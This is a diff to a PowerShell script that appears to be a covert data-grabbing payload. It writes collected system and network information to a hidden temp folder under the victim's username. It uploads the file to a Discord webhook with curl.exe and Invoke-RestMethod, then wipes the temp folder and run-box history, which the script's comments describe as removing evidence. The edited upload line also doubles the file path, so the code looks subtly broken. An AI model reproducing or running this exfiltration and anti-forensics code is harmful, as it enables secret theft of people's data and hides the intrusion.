@@ -3,8 +3,8 @@
 # $dc = "YOUR-DISCORD-WEBHOOK"
 
 #------------------------------------------------------------------------------------------------------------------------------------
-New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"; Set-Location -Path "$env:temp/js2k3kd4nne5dhsk";
-$FileName = "USERNAME-$(get-date -f yyyy-MM-dd).txt"
+New-Item -Path $env:temp -Name "F13C3D8F-8A17-4898-A36A-6294A160288A" -ItemType "directory";
+$FileName = "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # Network info
@@ -83,7 +83,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$FileName}
 #if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
@@ -94,7 +94,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 # Delete contents of Temp folder 
-rm $env:temp\* -r -Force -ErrorAction SilentlyContinue
+rm $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
